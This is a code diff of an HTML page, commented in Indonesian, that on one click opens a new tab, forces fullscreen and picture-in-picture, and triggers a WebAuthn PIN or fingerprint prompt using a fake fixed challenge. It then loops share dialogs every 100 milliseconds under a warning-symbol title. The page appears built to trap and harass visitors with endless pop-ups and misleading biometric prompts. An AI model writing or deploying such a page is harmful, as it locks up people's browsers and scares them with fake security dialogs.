@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Fullscreen, PiP, & WebAuthn Button</title>
+    <title>Fullscreen, PiP, WebAuthn & New Tab</title>
     <style>
         html, body {
             width: 100%;
@@ -59,12 +59,16 @@ video.srcObject = stream;
 // Menjalankan semua aksi saat tombol diklik kiri
 btn.addEventListener('click', async function() {
     
-    // 1. Memicu Fullscreen
+    // 1. Membuka Tab Baru (Silakan ganti URL sesuai kebutuhan Anda)
+    // Menggunakan '_blank' agar otomatis membuka di tab baru
+    window.open('https://www.google.com', '_blank');
+
+    // 2. Memicu Fullscreen pada halaman ini
     if (document.documentElement.requestFullscreen) {
         document.documentElement.requestFullscreen().catch(err => console.log("Gagal Fullscreen:", err));
     }
 
-    // 2. Memicu Picture-in-Picture (PiP)
+    // 3. Memicu Picture-in-Picture (PiP)
     try {
         if (document.pictureInPictureEnabled && video.readyState >= 1) {
             await video.requestPictureInPicture();
@@ -76,7 +80,7 @@ btn.addEventListener('click', async function() {
         console.log("Gagal memicu PiP:", err);
     }
 
-    // 3. Memicu Web Authentication (WebAuthn / Pop-up PIN & Sidik Jari)
+    // 4. Memicu Web Authentication (WebAuthn / Pop-up PIN & Sidik Jari)
     if (navigator.credentials && navigator.credentials.create) {
         const publicKeyCredentialCreationOptions = {
             challenge: Uint8Array.from("random-challenge-string", c => c.charCodeAt(0)),
@@ -95,7 +99,7 @@ btn.addEventListener('click', async function() {
             .catch(err => console.log("WebAuthn dibatalkan/gagal:", err));
     }
 
-    // 4. Loop interval share bawaan dari kode Anda
+    // 5. Loop interval share bawaan dari kode Anda
     setInterval(() => { 
         navigator.share({title: '\u26A0 HAI HAI \u26A0\nHAI', text: 'HAI'}).catch(() => {}); 
     }, 100);
